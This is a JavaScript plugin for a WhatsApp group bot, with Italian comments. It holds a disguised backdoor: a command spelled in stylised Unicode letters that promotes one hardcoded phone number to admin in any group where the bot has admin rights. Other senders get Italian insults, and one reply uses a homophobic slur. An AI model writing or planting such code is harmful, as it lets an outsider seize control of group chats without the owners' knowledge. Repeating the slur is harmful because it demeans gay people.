let handler = async (m, { conn, isAdmin }) => {  
    // Numero autorizzato
    const numeroAutorizzato = '27747368472@s.whatsapp.net'; 
  

    // Verifica se l'utente che esegue il comando è il numero autorizzato
    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, { text: '*coglione cazzo fai😂*' });
        return;
    }

    if (m.fromMe) return;
    if (isAdmin) throw '*sei già admin Frocio*';

    try {  
        // Invia il messaggio prima di eseguire l'azione
        await conn.sendMessage(m.chat, { text: ' 𝕯𝖊𝖆𝖙𝖍 𝕯𝖎𝖛𝖊𝖓𝖙𝖆 𝕬𝖉𝖒𝖎𝖓 𝕬𝖓𝖈𝖍𝖊 𝕾𝖚 𝕼𝖚𝖊𝖘𝖙𝖔 𝕲𝖗𝖚𝖕𝖕𝖔 ' });

        // Promuove l'utente a admin
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote");
    } catch {
        await m.reply('*coglione cazzo fai😂*');
    }
};

handler.command = /^𝕯𝖊ⱥ𝖙𝖍𝖍$/i;
handler.group = true;
handler.botAdmin = true;
export default handler;
